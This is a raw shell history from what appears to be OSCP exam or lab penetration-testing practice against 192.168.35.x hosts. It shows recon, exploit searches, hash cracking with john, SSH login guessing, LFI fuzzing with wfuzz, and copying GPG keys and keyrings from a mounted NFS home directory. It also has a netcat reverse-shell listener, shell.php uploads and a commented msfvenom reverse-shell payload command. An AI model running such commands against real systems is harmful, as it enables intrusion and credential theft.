 9854  2020-12-06 07:32  l
 9855  2020-12-06 07:33  cat .profile
 9856  2020-12-06 07:33  cd .ssh
 9857  2020-12-06 07:33  ls
 9858  2020-12-06 07:33  l
 9859  2020-12-06 07:33  cd ..
 9860  2020-12-06 07:33  l
 9861  2020-12-06 07:35  ls
 9862  2020-12-06 07:35  l
 9863  2020-12-06 07:35  cat tcp_7080_http_nikto.txt
 9864  2020-12-06 07:35  l
 9865  2020-12-06 07:35  cat tcp_7080_http_gobuster.txt
 9866  2020-12-06 07:35  ls
 9867  2020-12-06 07:37  cd .gnupg
 9868  2020-12-06 07:37  l
 9869  2020-12-06 08:02  cat tcp_21_ftp_nmap.txt
 9870  2020-12-06 08:03  ftp 192.168.35.97
 9871  2020-12-06 08:03  searchsploit flightpath
 9872  2020-12-06 08:04  searchsploit -x php/webapps/47121.txt
 9873  2020-12-06 08:07  l
 9874  2020-12-06 08:07  cat tcp_7080_http_nikto.txt
 9875  2020-12-06 08:08  ls
 9876  2020-12-06 08:09  l
 9877  2020-12-06 08:09  cat tcp_445_smb_nmap.txt
 9878  2020-12-06 08:10  smbclient   //192.168.35.97/oscp
 9879  2020-12-06 08:10  l
 9880  2020-12-06 08:10  cat tcp_445_smb_nmap.txt
 9881  2020-12-06 08:10  smbclient   //192.168.35.97/workgroup
 9882  2020-12-06 08:11  searchsploit Samba smbd 4.3.11Samba smbd 4.3.11
 9883  2020-12-06 08:11  searchsploit Samba smbd 4.3.11
 9884  2020-12-06 08:11  searchsploit Samba smbd \n: 1607242293:0;searchsploit Samba smbd 
 9885  2020-12-06 08:11  searchsploit Samba 
 9886  2020-12-06 08:12  l
 9887  2020-12-06 08:12  cat smbmap-share-permissions.txt
 9888  2020-12-06 08:12  cat smbmap-list-contents.txt
 9889  2020-12-06 08:12  cat smbmap-execute-command.txt
 9890  2020-12-06 08:12  cp ~/OSCP/8/tmp/shell.php ./
 9891  2020-12-06 08:12  l
 9892  2020-12-06 08:12  vim s
 9893  2020-12-06 08:12  ip a
 9894  2020-12-06 08:12  vim shell.php
 9895  2020-12-06 08:13  sudo rlwrap nc -lnvp 443
 9896  2020-12-06 08:21  searchsploit millhouse
 9897  2020-12-06 08:21  searchsploit -x php/webapps/47583.txt
 9898  2020-12-06 08:21  l
 9899  2020-12-06 08:21  cat tcp_80_http_gobuster.txt
 9900  2020-12-06 08:24  l
 9901  2020-12-06 08:24  exit
 9902  2020-12-06 08:24  cat tcp_7080_http_gobuster.txt
 9903  2020-12-06 08:25  cat ~/Downloads/user.info
 9904  2020-12-06 08:26  searchsploit FlightPath
 9905  2020-12-06 08:33  cat ~/Downloads/admin.info 
 9906  2020-12-06 08:33  strings ~/Downloads/admin.info 
 9907  2020-12-06 08:44  l
 9908  2020-12-06 08:45  cat tcp_7080_http_gobuster.txt
 9909  2020-12-06 08:47  strings ~/Downloads/student_search.info
 9910  2020-12-06 08:53  l
 9911  2020-12-06 08:53  cat tcp_7080_http_robots.txt
 9912  2020-12-06 08:53  cat tcp_21_ftp_nmap.txt
 9913  2020-12-06 08:53  searchspliot vsftpd 2.0.8 
 9914  2020-12-06 08:54  searchsploit vsftpd 2.0.8 
 9915  2020-12-06 08:54  searchsploit vsftpd 2.
 9916  2020-12-06 08:57  l
 9917  2020-12-06 08:58  cat tcp_7080_http_nikto.txt
 9918  2020-12-06 09:01  ls
 9919  2020-12-06 09:01  cd scans
 9920  2020-12-06 09:01  l
 9921  2020-12-06 09:01  atftp 192.168.35.87
 9922  2020-12-06 09:01  touch lol
 9923  2020-12-06 09:01  atftp 192.168.35.87
 9924  2020-12-06 09:02  ls
 9925  2020-12-06 09:02  rm lol
 9926  2020-12-06 09:02  atftp 192.168.35.87
 9927  2020-12-06 09:02  l
 9928  2020-12-06 09:02  rm lol
 9929  2020-12-06 09:02  rm \\lol
 9930  2020-12-06 09:02  rm c:\\lol
 9931  2020-12-06 09:02  l
 9932  2020-12-06 09:03  touch tom
 9933  2020-12-06 09:03  vim tom
 9934  2020-12-06 09:03  k
 9935  2020-12-06 09:03  l
 9936  2020-12-06 09:03  cat tom
 9937  2020-12-06 09:03  l
 9938  2020-12-06 09:03  atftp 192.168.35.87
 9939  2020-12-06 09:03  l
 9940  2020-12-06 09:03  rm l
 9941  2020-12-06 09:03  rm tom
 9942  2020-12-06 09:03  atftp 192.168.35.87
 9943  2020-12-06 09:03  l
 9944  2020-12-06 09:03  rm tom
 9945  2020-12-06 09:04  l
 9946  2020-12-06 09:04  cd ..
 9947  2020-12-06 09:04  k
 9948  2020-12-06 09:04  l
 9949  2020-12-06 09:04  cd scans
 9950  2020-12-06 09:04  l
 9951  2020-12-06 09:04  cd ..
 9952  2020-12-06 09:04  l
 9953  2020-12-06 09:04  cd ..
 9954  2020-12-06 09:04  l
 9955  2020-12-06 09:04  cd
 9956  2020-12-06 09:06  searchsploit Pic-A-Point
 9957  2020-12-06 09:06  searchsploit -x php/webapps/47427.txt
 9958  2020-12-06 09:07  l
 9959  2020-12-06 09:07  cat tcp_80_http_gobuster.txt
 9960  2020-12-06 09:10  searchsploit -x php/webapps/47427.txt
 9961  2020-12-06 09:22  exit
 9962  2020-12-06 09:24  qbpxq1qjzqq1
 9963  2020-12-06 09:24  ssh juan@192.168.35.86
 9964  2020-12-06 09:25  ssh juandelacruz@192.168.35.86
 9965  2020-12-06 09:29  searchsploit -x php/webapps/47427.txt
 9966  2020-12-06 09:40  touch hash
 9967  2020-12-06 09:40  vim hash
 9968  2020-12-06 09:42  qbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqq
 9969  2020-12-06 09:42  cat qbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqq > hash
 9970  2020-12-06 09:42  ls
 9971  2020-12-06 09:42  l
 9972  2020-12-06 09:42  cat qbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqq > hash
 9973  2020-12-06 09:42  echo 'qbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqq' > hash
 9974  2020-12-06 09:42  cat hash
 9975  2020-12-06 09:42  john  -w=/usr/share/wordlists/rockyou.txt hash
 9976  2020-12-06 09:42  ssh juan@192.168.35.86
 9977  2020-12-06 09:46  searchsploit -x php/webapps/47427.txt
 9978  2020-12-06 09:47  qbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqq
 9979  2020-12-06 09:48  searchsploit -x php/webapps/47427.txt
 9980  2020-12-06 10:07  qbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqq
 9981  2020-12-06 10:07  ssh juan@192.168.35.86
 9982  2020-12-06 10:09  ssh francis@192.168.35.86
 9983  2020-12-06 10:10  ssh Jose@192.168.35.86
 9984  2020-12-06 10:11  ssh jose@192.168.35.86
 9985  2020-12-06 10:11  ssh Juan@192.168.35.86
 9986  2020-12-06 10:11  ssh Francis@192.168.35.86
 9987  2020-12-06 10:12  ssh Dela@192.168.35.86
 9988  2020-12-06 10:12  ssh dela@192.168.35.86
 9989  2020-12-06 10:13  ssh erika@192.168.35.86
 9990  2020-12-06 10:14  qbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqq
 9991  2020-12-06 10:14  ssh erika@192.168.35.86
 9992  2020-12-06 10:14  ssh john@192.168.35.86
 9993  2020-12-06 10:14  ssh kimberly@192.168.35.86
 9994  2020-12-06 10:15  ssh christopher@192.168.35.86
 9995  2020-12-06 10:15  l
 9996  2020-12-06 10:15  cat tcp_80_http_gobuster.txt
 9997  2020-12-06 17:11  sudo -s
 9998  2020-12-06 17:13  tmux new -s HTB
 9999  2020-12-06 17:13  ls
10000  2020-12-06 17:13  exit
10001  2020-12-06 17:13  c
10002  2020-12-06 17:13  ccd OSCP_Exam
10003  2020-12-06 17:13  l
10004  2020-12-06 17:13  cd OSCP_Exam
10005  2020-12-06 17:13  l
10006  2020-12-06 17:14  cd results
10007  2020-12-06 17:14  l
10008  2020-12-06 17:14  cd 192.168.35.86
10009  2020-12-06 17:14  ls
10010  2020-12-06 17:14  cd scans
10011  2020-12-06 17:14  l
10012  2020-12-06 17:14  cat hash
10013  2020-12-06 17:19  searchsploit Pic-A-Point
10014  2020-12-06 17:19  searchsploit  php/webapps/47427.txt
10015  2020-12-06 17:19  searchsploit  -x php/webapps/47427.txt
10016  2020-12-06 17:23  john  -w=/usr/share/wordlists/rockyou.txt hash
10017  2020-12-06 17:23  john  -w=/usr/share/wordlists/rockyou.txt qbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqqqbpxqaKfawQXrEjqwpokeMTtNudNKYvHIgBFLcFeheeNgqjzqq
10018  2020-12-06 17:24  ssh lanao@192.168.35.86
10019  2020-12-06 17:25  ssh capas@192.168.35.86
10020  2020-12-06 17:25  ssh conception@192.168.35.86
10021  2020-12-06 17:26  ssh root@192.168.35.86
10022  2020-12-06 17:27  ssh erika@192.168.35.86
10023  2020-12-06 17:27  l
10024  2020-12-06 17:27  cat tcp_80_http_robots.txt
10025  2020-12-06 17:28  cat tcp_80_http_nmap.txt
10026  2020-12-06 17:28  l
10027  2020-12-06 17:28  cat tcp_7080_http_whatweb.txt
10028  2020-12-06 17:28  l
10029  2020-12-06 17:29  cat tcp_80_http_nikto.txt
10030  2020-12-06 17:29  l
10031  2020-12-06 17:29  cat tcp_22_ssh_nmap.txt
10032  2020-12-06 17:29  l
10033  2020-12-06 17:30  cat hash
10034  2020-12-06 17:30  cat tcp_7080_http_gobuster.txt
10035  2020-12-06 17:31  searchsploit File Thingie
10036  2020-12-06 17:31  serachsploit php/webapps/12617.txt
10037  2020-12-06 17:31  searchsploit -x php/webapps/12617.txt
10038  2020-12-06 17:35  ls ~/OSCP/dev_dept/10.2.2.86/report
10039  2020-12-06 17:35  ls ~/OSCP/dev_dept/10.2.2.86/exploit
10040  2020-12-06 17:35  cp  ~/OSCP/dev_dept/10.2.2.86/exploit/winlfi.txt
10041  2020-12-06 17:35  cp  ~/OSCP/dev_dept/10.2.2.86/exploit/winlfi.txt ./
10042  2020-12-06 17:35  cp  ~/OSCP/dev_dept/10.2.2.86/exploit/winlfi2.txt ./
10043  2020-12-06 17:35  l
10044  2020-12-06 17:36  less winlfi2.txt
10045  2020-12-06 17:37  cp  ~/Downloads/lfi2.txt ./
10046  2020-12-06 17:37  l
10047  2020-12-06 17:37  less lfi2.txt
10048  2020-12-06 17:37  #wfuzz -c -w ./lflfi2.txt -u http://192.168.35.86:7080/ft2.php\?dir\=FUZZ  --hw 235,234,236,237,238
10049  2020-12-06 17:37  wfuzz -c -w ./lflfi2.txt -u http://192.168.35.86:7080/ft2.php\?dir\=FUZZ  --hw 235,234,236,237,238
10050  2020-12-06 17:38  wfuzz -c -w ./lfi2.txt -u http://192.168.35.86:7080/ft2.php\?dir\=FUZZ  --hw 235,234,236,237,238
10051  2020-12-06 17:43  l
10052  2020-12-06 17:43  cat tcp_7080_http_gobuster.txt
10053  2020-12-06 17:45  l
10054  2020-12-06 17:45  cat tcp_7080_http_gobuster.txt
10055  2020-12-06 17:46  cat tcp_80_http_robots.txt
10056  2020-12-06 17:46  cat tcp_80_http_gobuster.txt
10057  2020-12-06 17:46  l
10058  2020-12-06 17:47  cat 80dirb
10059  2020-12-06 17:47  l
10060  2020-12-06 17:47  cat 7080dirb
10061  2020-12-06 17:50  l
10062  2020-12-06 17:51  sudo mount -t nfs  192.168.35.113:/home/thomas /mnt/thomas -o nolock
10063  2020-12-06 17:55  l
10064  2020-12-06 17:55  cd ..
10065  2020-12-06 17:55  l
10066  2020-12-06 17:55  cd ..
10067  2020-12-06 17:55  l
10068  2020-12-06 17:55  cd 192.168.35.87l
10069  2020-12-06 17:55  cd 192.168.35.87
10070  2020-12-06 17:55  l
10071  2020-12-06 17:55  cd scans
10072  2020-12-06 17:55  l
10073  2020-12-06 17:56  cat tcp_21_ftp_nmap.txt
10074  2020-12-06 17:56  ftp 192.168.35.87
10075  2020-12-06 17:57  l
10076  2020-12-06 17:57  vim system.old
10077  2020-12-06 17:57  ftp 192.168.35.87
10078  2020-12-06 18:00  cp ~/OSCP/results/10.11.1.73/exploit/shell.php ./
10079  2020-12-06 18:00  ftp 192.168.35.87
10080  2020-12-06 18:01  l
10081  2020-12-06 18:01  cat tcp_80_http_gobuster.txt
10082  2020-12-06 18:01  msfconsole -q 
10083  2020-12-06 18:08  ip a
10084  2020-12-06 18:12  l
10085  2020-12-06 18:13  cat udp_69_tftp-nmap.txt
10086  2020-12-06 18:13  nmap -n -Pn -sU -p69 -sV --script tftp-enum 192.168.35.87
10087  2020-12-06 18:13  sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum 192.168.35.87
10088  2020-12-06 18:17  l
10089  2020-12-06 18:18  cat udp_69_tftp-nmap.txt
10090  2020-12-06 18:18  sudo nmap -n  -sU -p69 -sV --script tftp-enum 192.168.35.87
10091  2020-12-06 18:18  cd /mnt/thomas
10092  2020-12-06 18:19  l
10093  2020-12-06 18:19  cat .bash_history
10094  2020-12-06 18:20  cat .bash_logout
10095  2020-12-06 18:20  cat .bashrc
10096  2020-12-06 18:20  l
10097  2020-12-06 18:22  atftp 192.168.35.87
10098  2020-12-06 18:23  l
10099  2020-12-06 18:23  caat tcp_21_ftp_nmap.txt
10100  2020-12-06 18:23  cat tcp_21_ftp_nmap.txt
10101  2020-12-06 18:23  searchsploit FileZilla
10102  2020-12-06 18:24  cd .mozilla
10103  2020-12-06 18:24  l
10104  2020-12-06 18:24  cd systemextensionsdev
10105  2020-12-06 18:24  l
10106  2020-12-06 18:24  cd //
10107  2020-12-06 18:24  cd /mnt/thomas/.mozilla/systemextensionsdev
10108  2020-12-06 18:24  cd ...
10109  2020-12-06 18:24  l
10110  2020-12-06 18:25  cd .mozilla
10111  2020-12-06 18:25  ls
10112  2020-12-06 18:25  cd firefox
10113  2020-12-06 18:25  l
10114  2020-12-06 18:25  cat installs.ini
10115  2020-12-06 18:26  xsscd ..
10116  2020-12-06 18:26  l
10117  2020-12-06 18:26  cd ..
10118  2020-12-06 18:26  l
10119  2020-12-06 18:26  cd ..
10120  2020-12-06 18:26  l
10121  2020-12-06 18:27  cat .gnupg
10122  2020-12-06 18:27  l
10123  2020-12-06 18:27  cd .gnupg
10124  2020-12-06 18:27  l
10125  2020-12-06 18:27  cd private-keys-v1.d
10126  2020-12-06 18:27  ls
10127  2020-12-06 18:27  l
10128  2020-12-06 18:27  cd ..
10129  2020-12-06 18:29  gpg --list-keys
10130  2020-12-06 18:31  #cp  ~/.gnupg
10131  2020-12-06 18:31  cd ..
10132  2020-12-06 18:31  l
10133  2020-12-06 18:32  cp .gnupg ~/.gnupg
10134  2020-12-06 18:32  cp -r .gnupg ~/.gnupg
10135  2020-12-06 18:32  cd ~/.gnupg\n
10136  2020-12-06 18:32  ls
10137  2020-12-06 18:32  l
10138  2020-12-06 18:32  cat .#lk0x0000559da213d330.kali.19346\n
10139  2020-12-06 18:32  cd .gnupg
10140  2020-12-06 18:32  l
10141  2020-12-06 18:33  cat pubring.kbx
10142  2020-12-06 18:33  strings pubring.kbx
10143  2020-12-06 18:33  stringss trustdb.gpg
10144  2020-12-06 18:33  strings trustdb.gpg
10145  2020-12-06 18:33  cd ..
10146  2020-12-06 18:33  l
10147  2020-12-06 18:34  gpg --import trustdb.gpg
10148  2020-12-06 18:34  gpg --allow-secret-key-import --import ~/mygpgkey_sec.gpg 
10149  2020-12-06 18:34  l
10150  2020-12-06 18:35  cd /mnt/thomas
10151  2020-12-06 18:35  ls
10152  2020-12-06 18:35  l
10153  2020-12-06 18:35  cd  .locall
10154  2020-12-06 18:35  cd  .local
10155  2020-12-06 18:35  l
10156  2020-12-06 18:35  cd share
10157  2020-12-06 18:35  l
10158  2020-12-06 18:35  cd gnome-settings-daemon
10159  2020-12-06 18:35  l
10160  2020-12-06 18:36  caat input-sources-converted
10161  2020-12-06 18:36  cat input-sources-convertedi
10162  2020-12-06 18:36  cat input-sources-converted
10163  2020-12-06 18:36  cd ..
10164  2020-12-06 18:36  l
10165  2020-12-06 18:36  cat recently-used.xbel
10166  2020-12-06 18:36  cd keyrings
10167  2020-12-06 18:36  l
10168  2020-12-06 18:36  cat login.keyring
10169  2020-12-06 18:36  strings login.keyring
10170  2020-12-06 18:36  strings user.keystore
10171  2020-12-06 18:38  ;
10172  2020-12-06 18:38  l
10173  2020-12-06 18:38  cd ..
10174  2020-12-06 18:38  l
10175  2020-12-06 18:38  cd icc
10176  2020-12-06 18:38  ls
10177  2020-12-06 18:38  cd ..
10178  2020-12-06 18:38  l
10179  2020-12-06 18:38  cd ..
10180  2020-12-06 18:38  l
10181  2020-12-06 18:38  cd ..
10182  2020-12-06 18:38  l;
10183  2020-12-06 18:38  l
10184  2020-12-06 18:39  cd .local
10185  2020-12-06 18:39  l
10186  2020-12-06 18:39  cd share
10187  2020-12-06 18:39  l
10188  2020-12-06 18:39  cd ..
10189  2020-12-06 18:39  l
10190  2020-12-06 18:40  cd 
10191  2020-12-06 18:41  cd OSCP
10192  2020-12-06 18:41  l
10193  2020-12-06 18:41  cd results
10194  2020-12-06 18:41  l
10195  2020-12-06 18:41  cd
10196  2020-12-06 18:41  l
10197  2020-12-06 18:41  cd OSCP_Exam
10198  2020-12-06 18:41  l
10199  2020-12-06 18:41  cd  results
10200  2020-12-06 18:41  l
10201  2020-12-06 18:41  cd 192.168.35.86
10202  2020-12-06 18:41  l
10203  2020-12-06 18:41  cd exploit
10204  2020-12-06 18:41  l
10205  2020-12-06 18:41  cd ..
10206  2020-12-06 18:41  l
10207  2020-12-06 18:41  cd scans
10208  2020-12-06 18:41  l
10209  2020-12-06 18:42  wfuzz -c -w ./lfi2.txt -u 192.168.35.97:7080/index.php?q=FUZZ  --hw 235,234,236,237,238
10210  2020-12-06 18:42  wfuzz -c -w ./lfi2.txt -u http://192.168.35.86:7080/ft2.php\?dir\=FUZZ  --hw 235,234,236,237,238
10211  2020-12-06 18:42  wfuzz -c -w ./lfi2.txt -u http://192.168.35.97:7080/index.php?q=FUZZ  --hw 235,234,236,237,238
10212  2020-12-06 18:43  wfuzz -c -w ./lfi2.txt -u http://192.168.35.97:7080/index.php\?q\=FUZZ  --hw 235,234,236,237,238
10213  2020-12-06 18:44  l
10214  2020-12-06 18:44  cat lfi2.txt
10215  2020-12-06 18:44  wfuzz -c -w ./lfi2.txt -u http://192.168.35.97:7080/index.php\?q\=FUZZ  --hw 235,234,236,237,238
10216  2020-12-06 18:45  l
10217  2020-12-06 18:45  leess lfi2.txt
10218  2020-12-06 18:45  less lfi2.txt
10219  2020-12-06 18:46  wfuzz -c -w ./lfi2.txt -u http://192.168.35.97:7080/index.php?q=FUZZ  --hw 235,234,236,237,238
10220  2020-12-06 18:46  wfuzz -c -w ./lfi2.txt -u http://192.168.35.97:7080/index.php\?q\=FUZZ  --hw 235,234,236,237,238
10221  2020-12-06 18:50  cd ..
10222  2020-12-06 18:50  l
10223  2020-12-06 18:50  cd ..
10224  2020-12-06 18:50  l
10225  2020-12-06 18:50  cd ..
10226  2020-12-06 18:50  l
10227  2020-12-06 18:50  cd BOF
10228  2020-12-06 18:50  l
10229  2020-12-06 18:50  cat exploit.py
10230  2020-12-06 20:30  l
10231  2020-12-06 20:30  ll
10232  2020-12-06 20:42  ls
10233  2020-12-06 20:42  l
10234  2020-12-06 20:42  ll
10235  2020-12-06 20:42  l
10236  2020-12-06 20:42  cd .ssh
10237  2020-12-06 20:42  l
10238  2020-12-06 20:42  vim config
10239  2020-12-06 20:43  cd
10240  2020-12-06 20:46  git clone https://github.com/goonmax/dotfiles.git
10241  2020-12-06 20:48  ls
10242  2020-12-06 20:48  l
10243  2020-12-06 20:48  ll
10244  2020-12-06 20:50  ls
10245  2020-12-06 20:51  ll
10246  2020-12-06 20:53  l
10247  2020-12-06 20:53  ll
10248  2020-12-06 20:53  cd dotfiles
10249  2020-12-06 20:53  l
10250  2020-12-06 20:53  cd ..
10251  2020-12-06 20:53  cp .vimrc dotfiles
10252  2020-12-06 20:54  cp .tmux.conf  dotfiles
10253  2020-12-06 20:54  cp .zshrc  dotfiles
10254  2020-12-06 20:54  cp .ssh/config Documents
10255  2020-12-06 20:54  cp .ssh/config dotfiles
10256  2020-12-06 20:54  l
10257  2020-12-06 20:54  ll
10258  2020-12-06 20:55  sudo vim /etc/samba/smb.conf
10259  2020-12-06 20:55  cd dotfiles
10260  2020-12-06 20:56  cat /etc/samba/smb.conf > smb.conf
10261  2020-12-06 20:56  l
10262  2020-12-06 20:56  cd
10263  2020-12-06 20:59  pip3
10264  2020-12-06 21:05  pip3 list
10265  2020-12-06 21:05  pip3 list > dotfiles/pip3packages
10266  2020-12-06 21:06  pip list > dotfiles/pippackages
10267  2020-12-06 21:06  pip list
10268  2020-12-06 21:08  pip list > dotfiles/pippackages
10269  2020-12-06 21:09  sudo apt -h
10270  2020-12-06 21:09  sudo apt list
10271  2020-12-06 21:25  l
10272  2020-12-06 21:25  ll
10273  2020-12-06 21:44  l
10274  2020-12-06 21:44  ;l
10275  2020-12-06 21:45  ll
10276  2020-12-06 21:53  l
10277  2020-12-06 21:53  ll
10278  2020-12-06 21:53  cd OSCP
10279  2020-12-06 21:54  l
10280  2020-12-06 21:54  git status
10281  2020-12-06 21:59  git add *
10282  2020-12-06 21:59  git commit -m "last oscp commit"
10283  2020-12-06 22:00  git push
10284  2020-12-06 22:04  l
10285  2020-12-06 22:04  cd ..
10286  2020-12-06 22:05  l
10287  2020-12-06 22:14  ll
10288  2020-12-06 22:14  ls
10289  2020-12-06 22:14  l
10290  2020-12-06 22:14  ll
10291  2020-12-06 22:18  l
10292  2020-12-06 22:18  ll
10293  2020-12-06 22:18  l
10294  2020-12-06 22:18  ll
10295  2020-12-06 22:21  cd /etc/ssh
10296  2020-12-06 22:21  ls
10297  2020-12-06 22:21  cat ssh_host_rsa_key.pub
10298  2020-12-06 22:21  vim ssh_config
10299  2020-12-06 22:22  cat ssh_config > ~/dotfiles/ssh_config
10300  2020-12-06 22:28  l
10301  2020-12-06 22:28  cat sshd_config
10302  2020-12-06 22:28  tLog yes\n#TCPKeepAlive yes\n#PermitUserEnvironment no\n#Compression delayed\n#ClientAliveInterval 0\n#ClientAliveCountMax 3\n#UseDNS no\n#PidFile /var/run/sshd.pid\n#MaxStartups 10:30:100\n#PermitTunnel no\n#ChrootDirectory none\n#VersionAddendum none\n\n# no default banner path\n#Banner none\n\n# Allow client to pass locale environment variables\nAcceptEnv LANG LC_*\n\n# override default of no subsystems\nSubsystem       sftp    /usr/lib/openssh/sftp-server\n\n# Example of overriding settings on a per-user basis\n#Match User anoncvs\n#       X11Forwarding no\n#       AllowTcpForwarding no\n#       PermitTTY no\n#       ForceCommand cvs server\nPermitRootLogin yes\n\ntLog yes\n#TCPKeepAlive yes\n#PermitUserEnvironment no\n#Compression delayed\n#ClientAliveInterval 0\n#ClientAliveCountMax 3\n#UseDNS no\n#PidFile /var/run/sshd.pid\n#MaxStartups 10:30:100\n#PermitTunnel no\n#ChrootDirectory none\n#VersionAddendum none\n\n# no default banner path\n#Banner none\n\n# Allow client to pass locale environment variables\nAcceptEnv LANG LC_*\n\n# override default of no subsystems\nSubsystem       sftp    /usr/lib/openssh/sftp-server\n\n# Example of overriding settings on a per-user basis\n#Match User anoncvs\n#       X11Forwarding no\n#       AllowTcpForwarding no\n#       PermitTTY no\n#       ForceCommand cvs server\nPermitRootLogin yes\n\n
10303  2020-12-06 22:28  ls
10304  2020-12-06 22:28  cd ..
10305  2020-12-06 22:28  l
10306  2020-12-06 22:28  cd
10307  2020-12-06 22:30  cat /etc/ssh/sshd_config > ~/dotfiles/sshdd_config
10308  2020-12-06 22:30  l
10309  2020-12-06 22:30  ll
10310  2020-12-06 22:32  mv oscpdata OSCP
10311  2020-12-06 22:34  l
10312  2020-12-06 22:34  ll
10313  2020-12-06 22:48  cd OSCP
10314  2020-12-06 22:48  git add *
10315  2020-12-06 22:48  it rm --cached oscpdata/p0wny-shell
10316  2020-12-06 22:48  git rm --cached oscpdata/p0wny-shell
10317  2020-12-06 22:49  git rm -f --cached oscpdata/p0wny-shell
10318  2020-12-06 22:49  l
10319  2020-12-06 22:49  cd oscpdata
10320  2020-12-06 22:49  l
10321  2020-12-06 22:49  rm -rf p0wny-shell
10322  2020-12-06 22:56  l
10323  2020-12-06 22:56  ll
10324  2020-12-06 22:56  cd ..
10325  2020-12-06 22:56  l;
10326  2020-12-06 22:56  git add *
10327  2020-12-06 22:57  git commit -m "last oscp commit"
10328  2020-12-06 22:57  git push
10329  2020-12-06 23:02  cd ..
10330  2020-12-06 23:02  l
10331  2020-12-06 23:02  ll
10332  2020-12-06 23:06  l
10333  2020-12-06 23:06  ll
10334  2020-12-06 23:06  cd OSCP
10335  2020-12-06 23:06  l
10336  2020-12-06 23:06  cd ..
10337  2020-12-06 23:06  l
10338  2020-12-06 23:06  ll
10339  2020-12-06 23:07  mv OSCP_Exam OSCP
10340  2020-12-06 23:07  l
10341  2020-12-06 23:07  ll
10342  2020-12-06 23:07  cd OSCP/
10343  2020-12-06 23:07  git add *
10344  2020-12-06 23:07  git commit -m "last oscp commit"
10345  2020-12-06 23:13  git push
10346  2020-12-06 23:21  l
10347  2020-12-06 23:21  cd ..
10348  2020-12-06 23:21  l
10349  2020-12-06 23:24  ll
10350  2020-12-06 23:24  ls
10351  2020-12-06 23:48  l
10352  2020-12-06 23:48  ll
10353  2020-12-06 23:49  ls
10354  2020-12-06 23:49  l
10355  2020-12-06 23:50  #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.35 LPORT=443 EXITFUNC=thread -b "\x00\x04\x76\x77\x99\xf3" -f py
10356  2020-12-06 23:50  l
10357  2020-12-06 23:50  historry
10358  2020-12-06 23:50  history
10359  2020-12-06 23:51  cd dotfiles
